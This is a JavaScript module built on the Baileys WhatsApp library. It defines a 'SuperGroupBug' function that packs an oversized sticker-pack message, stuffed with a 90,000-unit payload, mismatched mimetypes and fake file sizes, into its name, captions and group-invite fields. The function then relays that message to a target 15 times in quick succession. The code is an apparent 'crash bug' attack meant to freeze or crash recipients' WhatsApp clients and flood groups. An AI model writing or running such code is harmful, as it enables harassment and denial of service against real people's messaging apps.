
const { generateWAMessageFromContent, delay } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

function createSticker(fileName) {
  return {
    fileName,
    isAnimated: false,
    isLottie: true,
    mimetype: "application/pdf",
    emojis: ["🀄"],
    accessibilityLabel: "ROBIN BUG"
  };
}

async function SuperGroupBug(SYxS7, target) {
    try {
        const superSpam = getSuperPayload(90000); // 90k heavy data
        const stickers = Array(20).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
        
        // Construct a massive combined payload
        const payload = {
            stickerPackMessage: {
                stickerPackId: "ROBIN-SUPER-BUG",
                name: superSpam,
                publisher: "KING ROBIN",
                packDescription: superSpam,
                stickers: stickers,
                fileLength: "999999999",
                stickerPackSize: "999999999",
                contextInfo: {
                    externalAdReply: {
                        title: "🔥 SUPER GROUP DESTROYER 🔥",
                        body: superSpam,
                        showAdAttribution: true,
                        renderLargerThumbnail: true,
                        thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
                    },
                    quotedMessage: {
                        groupInviteMessage: {
                            groupName: superSpam,
                            groupJid: "561611-1627579259@g.us",
                            inviteCode: "h+64P9RhJDzgXSPf",
                            inviteExpiration: 32503680000,
                            caption: superSpam
                        }
                    }
                }
            }
        };

        // Repeatedly send the super message
        for (let i = 0; i < 15; i++) {
            await SYxS7.relayMessage(target, payload, {
                participant: { jid: target }
            });
            await delay(300); // Fast repetition
        }
    } catch (error) {
        console.error("SuperGroupBug failed:", error.message);
    }
}

module.exports = { SuperGroupBug };
